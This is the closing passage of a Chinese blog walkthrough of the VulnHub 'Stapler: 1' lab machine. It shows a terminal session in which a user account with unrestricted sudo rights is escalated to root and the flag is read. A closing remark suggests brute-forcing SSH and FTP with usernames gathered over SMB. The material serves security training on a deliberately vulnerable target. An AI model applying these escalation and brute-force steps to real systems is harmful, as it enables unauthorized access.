class="line"></span><br><span class="line">(0)  Exit, creating the file ~/.zshrc containing just a comment.</span><br><span class="line">     That will prevent this <span class="keyword">function</span> being run again.</span><br><span class="line"></span><br><span class="line">(1)  Continue to the main menu.</span><br><span class="line"></span><br><span class="line">(2)  Populate your ~/.zshrc with the configuration recommended</span><br><span class="line">     by the system administrator and <span class="built_in">exit</span> (you will need to edit</span><br><span class="line">     the file by hand, <span class="keyword">if</span> so desired).</span><br><span class="line"></span><br><span class="line">--- Type one of the keys <span class="keyword">in</span> parentheses --- q</span><br><span class="line">%                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               red% /bin/bash</span><br><span class="line">peter@red:/home/JKanode$ sudo -l</span><br><span class="line">Matching Defaults entries <span class="keyword">for</span> peter on red:</span><br><span class="line">    lecture=always, env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin</span><br><span class="line"></span><br><span class="line">User peter may run the following commands on red:</span><br><span class="line">    (ALL : ALL) ALL</span><br><span class="line">peter@red:/home/JKanode$ sudo su root</span><br><span class="line"><span class="comment">#                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               ➜  JKanode id</span></span><br><span class="line">uid=0(root) gid=0(root) <span class="built_in">groups</span>=0(root)</span><br><span class="line"><span class="comment">#                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               ➜  JKanode /bin/bash</span></span><br><span class="line">root@red:/home/JKanode<span class="comment"># cd ~</span></span><br><span class="line">root@red:~<span class="comment"># cat flag.txt </span></span><br><span class="line">~~~~~~~~~~&lt;(Congratulations)&gt;~~~~~~~~~~</span><br><span class="line">                          .-<span class="string">&#x27;&#x27;</span><span class="string">&#x27;&#x27;</span><span class="string">&#x27;-.</span></span><br><span class="line"><span class="string">                          |&#x27;</span>-----<span class="string">&#x27;|</span></span><br><span class="line"><span class="string">                          |-.....-|</span></span><br><span class="line"><span class="string">                          |       |</span></span><br><span class="line"><span class="string">                          |       |</span></span><br><span class="line"><span class="string">         _,._             |       |</span></span><br><span class="line"><span class="string">    __.o`   o`&quot;-.         |       |</span></span><br><span class="line"><span class="string"> .-O o `&quot;-.o   O )_,._    |       |</span></span><br><span class="line"><span class="string">( o   O  o )--.-&quot;`O   o&quot;-.`&#x27;</span>-----<span class="string">&#x27;`</span></span><br><span class="line"><span class="string"> &#x27;</span>--------<span class="string">&#x27;  (   o  O    o)  </span></span><br><span class="line"><span class="string">              `----------`</span></span><br><span class="line"><span class="string">b6b545dc11b7a270f4bad23432190c75162c4a2b</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">root@red:~#</span></span><br></pre></td></tr></table></figure>
<h2 id="补充">10. 补充</h2>
<p>可利用 SMB 扫到的用户名组个字典爆破 SSH 和 FTP，详见参考文章</p>
<h2 id="参考">11. 参考</h2>
<ul>
<li><a
target="_blank" rel="noopener" href="https://bond-o.medium.com/vulnhub-stapler-1-ab928900d614">VulnHub
— Stapler: 1. In reviewing multiple blogs and… | by Mike Bond |
Medium</a></li>
<li><a
target="_blank" rel="noopener" href="https://steflan-security.com/vulnhub-stapler-1-walkthrough/">VulnHub
- Stapler: 1 Walkthrough - Steflan's Security Blog</a><br />
</li>
<li><a
target="_blank" rel="noopener" href="https://www.infosecarticles.com/stapler-1-vulnhub-walkthrough/">Stapler
1 Vulnhub Walkthrough - Infosec Articles</a></li>
</ul>

    </div>

    
    
    

    <footer class="post-footer">
          

<div class="post-copyright">
<ul>
  <li class="post-copyright-author">
      <strong>本文作者： </strong>Phantom
  </li>
  <li class="post-copyright-link">
      <strong>本文链接：</strong>
      <a href="https://z9m8r8.github.io/2024/12/13/Stapler%201/" title="VulnHub - Stapler: 1">https://z9m8r8.github.io/2024/12/13/Stapler 1/</a>
  </li>
  <li class="post-copyright-license">
      <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
  </li>
</ul>
</div>

          <div class="post-tags">
              <a href="/tags/Vulnhub/" rel="tag"><i class="fa fa-tag"></i> Vulnhub</a>
              <a href="/tags/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/" rel="tag"><i class="fa fa-tag"></i> 信息收集</a>
              <a href="/tags/%E6%8F%90%E6%9D%83/" rel="tag"><i class="fa fa-tag"></i> 提权</a>
              <a href="/tags/FTP/" rel="tag"><i class="fa fa-tag"></i> FTP</a>
              <a href="/tags/%E5%8F%8D%E5%BC%B9-shell/" rel="tag"><i class="fa fa-tag"></i> 反弹 shell</a>
              <a href="/tags/SMB/" rel="tag"><i class="fa fa-tag"></i> SMB</a>
              <a href="/tags/Insecure-File-Upload/" rel="tag"><i class="fa fa-tag"></i> Insecure File Upload</a>
              <a href="/tags/Crontab/" rel="tag"><i class="fa fa-tag"></i> Crontab</a>
              <a href="/tags/LFI/" rel="tag"><i class="fa fa-tag"></i> LFI</a>
              <a href="/tags/MySQL/" rel="tag"><i class="fa fa-tag"></i> MySQL</a>
              <a href="/tags/Polkit/" rel="tag"><i class="fa fa-tag"></i> Polkit</a>
          </div>

        

          <div class="post-nav">
            <div class="post-nav-item">
                <a href="/2024/10/30/HackMyVM%20-%20Zero/" rel="prev" title="HackMyVM - Zero">
                  <i class="fa fa-angle-left"></i> HackMyVM - Zero
                </a>
            </div>
            <div class="post-nav-item">
                <a href="/2024/12/16/VulNyx%20-%20Experience/" rel="next" title="VulNyx - Experience">
                  VulNyx - Experience <i class="fa fa-angle-right"></i>
                </a>
            </div>
          </div>
    </footer>
  </article>
</div>






</div>
  </main>

  <footer class="footer">
    <div class="footer-inner">

  <div class="copyright">
    &copy; 2020 – 
    <span itemprop="copyrightYear">2024</span>
    <span class="with-love">
      <i class="fa fa-heart"></i>
    </span>
    <span class="author" itemprop="copyrightHolder">Phantom</span>
  </div>
<div class="wordcount">
  <span class="post-meta-item">
    <span class="post-meta-item-icon">
      <i class="fa fa-chart-line"></i>
    </span>
    <span title="站点总字数">342k</span>
  </span>
  <span class="post-meta-item">
    <span class="post-meta-item-icon">
      <i class="fa fa-coffee"></i>
    </span>
    <span title="站点阅读时长">20:42</span>
  </span>
</div>
  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
  </div>

    </div>
  </footer>

  
  <div class="back-to-top" role="button" aria-label="返回顶部">
    <i class="fa fa-arrow-up fa-lg"></i>
    <span>0%</span>
  </div>
  <div class="reading-progress-bar"></div>
  <a role="button" class="book-mark-link book-mark-link-fixed"></a>

  <a href="https://github.com/z9m8r8" class="github-corner" title="在 GitHub 上关注我" aria-label="在 GitHub 上关注我" rel="noopener" target="_blank"><svg width="80" height="80" viewBox="0 0 250 250" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a>

<noscript>
  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
</noscript>


  
  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/next-theme-pjax/0.6.0/pjax.min.js" integrity="sha256-vxLn1tSKWD4dqbMRyv940UYw4sXgMtYcK6reefzZrao=" crossorigin="anonymous"></script>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/fancyapps-ui/5.0.28/fancybox/fancybox.umd.js" integrity="sha256-ytMJGN3toR+a84u7g7NuHm91VIR06Q41kMWDr2pq7Zo=" crossorigin="anonymous"></script>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/lozad.js/1.16.0/lozad.min.js" integrity="sha256-mOFREFhqmHeQbXpK2lp4nA3qooVgACfh88fpJftLBbc=" crossorigin="anonymous"></script>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/pangu/4.0.7/pangu.min.js" integrity="sha256-j+yj56cdEY2CwkVtGyz18fNybFGpMGJ8JxG3GSyO2+I=" crossorigin="anonymous"></script>
<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/next-boot.js"></script><script src="/js/bookmark.js"></script><script src="/js/pjax.js"></script>

  <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.4.1/search.js" integrity="sha256-1kfA5uHPf65M5cphT2dvymhkuyHPQp5A53EGZOnOLmc=" crossorigin="anonymous"></script>
<script src="/js/third-party/search/local-search.js"></script>




  <script src="/js/third-party/fancybox.js"></script>

  <script src="/js/third-party/pace.js"></script>


  




  

  <script class="next-config" data-name="enableMath" type="application/json">true</script><script class="next-config" data-name="mathjax" type="application/json">{"enable":true,"tags":"ams","js":{"url":"https://cdnjs.cloudflare.com/ajax/libs/mathjax/3.2.2/es5/tex-mml-chtml.js","integrity":"sha256-MASABpB4tYktI2Oitl4t+78w/lyA+D7b/s9GEP0JOGI="}}</script>
<script src="/js/third-party/math/mathjax.js"></script>


  <script src="https://cdnjs.cloudflare.com/ajax/libs/quicklink/2.3.0/quicklink.umd.js" integrity="sha256-yvJQOINiH9fWemHn0vCA5lsHWJaHs6/ZmO+1Ft04SvM=" crossorigin="anonymous"></script>
  <script class="next-config" data-name="quicklink" type="application/json">{"enable":true,"home":true,"archive":true,"delay":true,"timeout":3000,"priority":true,"url":"https://z9m8r8.github.io/2024/12/13/Stapler%201/"}</script>
  <script src="/js/third-party/quicklink.js"></script>

</body>
</html>
